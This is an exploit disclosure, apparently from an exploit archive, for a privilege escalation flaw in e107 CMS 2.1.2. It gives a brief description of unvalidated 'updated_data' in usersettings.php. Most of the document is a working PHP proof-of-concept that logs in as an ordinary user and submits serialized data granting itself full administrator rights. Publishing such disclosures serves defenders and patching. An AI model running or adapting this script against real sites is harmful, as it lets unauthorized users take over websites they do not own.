# Date: 09-11-2016
# Software Link: http://e107.org/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: webapps
 
1. Description

Datas from `$_POST[&#039;updated_data&#039;]` inside `usersettings.php` are not properly validated so we can set `user_admin`.

http://security.szurek.pl/e107-cms-211-privilege-escalation.html

2. Proof of Concept

<?php

/**
 * e107 CMS 2.1.2 Privilege Escalation
 * Kacper Szurek
 * http://security.szurek.pl
 */
function hack($url, $login, $pass, $cookie){

	$ckfile = dirname(__FILE__) . $cookie;
	$cookie = fopen($ckfile, &#039;w&#039;) or die("Cannot create cookie file");

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(&#039;username&#039; => $login, &#039;userpass&#039; => $pass, &#039;userlogin&#039; => &#039;Sign In&#039;)));
	curl_setopt($ch, CURLOPT_POST, 1);
	$content = curl_exec($ch);
	if (strpos($content, &#039;?logout&#039;) === false) {
		die("Cannot login");
	}

	$data = array();
	$data[&#039;user_admin&#039;] = 1;
	$data[&#039;user_perms&#039;] = 0;
	$data[&#039;user_password&#039;] = md5($pass);

	curl_setopt($ch, CURLOPT_URL, $url.&#039;/usersettings.php&#039;);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(&#039;SaveValidatedInfo&#039; => 1, &#039;updated_data&#039; => base64_encode(serialize($data)), &#039;updated_key&#039; => md5(serialize($data)), &#039;currentpassword&#039; => $pass)));
	$content = curl_exec($ch);

	if (strpos($content, &#039;Settings updated&#039;) === false) {
		die("Exploit probably failed");
	}

	die(&#039;OK!&#039;);
}

$url = "http://url_here";

// Standard user credentials 
$user = "login_here";
$pass = "password_here";

$cookie = "/cookie.txt";
hack($url, $user, $pass, $cookie);

